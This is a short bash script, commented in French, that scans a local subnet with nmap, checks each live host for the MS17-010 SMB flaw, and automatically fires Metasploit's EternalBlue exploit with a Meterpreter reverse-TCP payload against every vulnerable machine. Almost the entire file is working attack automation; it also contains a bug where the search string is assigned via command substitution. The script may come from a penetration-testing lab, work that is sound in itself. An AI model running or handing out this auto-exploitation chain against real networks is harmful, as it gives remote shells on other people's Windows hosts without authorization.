#!/bin/bash
#!/usr/bin/env python3

######################
###\ \##/ /#| |#/ /###
####\ \/ /##| |/ /####
#####\  /###| |\ \####
#####/ /####| |#\ \###
####/_/#####|_|##\_\##
######################

IP=$(ip addr show eth0 | awk '/inet / {print$2}' | cut -d/ -f1)

#Récupération des hôtes actifs du sous-réseau
nmap -sn 192.168.100.0/24 | awk '/Nmap scan report for / {print $5}' > hostup.txt

#Compter le nombre de ligne dans un fichier
SEQ=$(wc -l hostup.txt | awk '{print $1}')

#Check des vulnérabilité sur chaque hôtes actifs
for i in $(seq 1 $SEQ);do
#Afficher la première ligne du fichier
LINE=$(cat hostup.txt | awk "NR==$i")
#Scan nmap des vulnérabilités d'un hôte
nmap -v --script vuln $LINE > LINE$i.txt
done

#Vérifier qu'un hôte soit vulnérable a la faille MS17-010
STRING=$("| smb-vuln-ms17-010:")

for i in $(seq 1 $SEQ);do
#Afficher la première ligne du fichier
LINE=$(cat hostup.txt | awk "NR==$i")
if [[ ! -z $(grep "$STRING" "LINE$i.txt") ]]; then

#Execution de l'exploit MS17_010
msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $IP ; set rhost $LINE ; exploit ; "

else
echo "No IP are vulnerable"; 
fi
done


rm hostup.txt
rm LINE*.txt
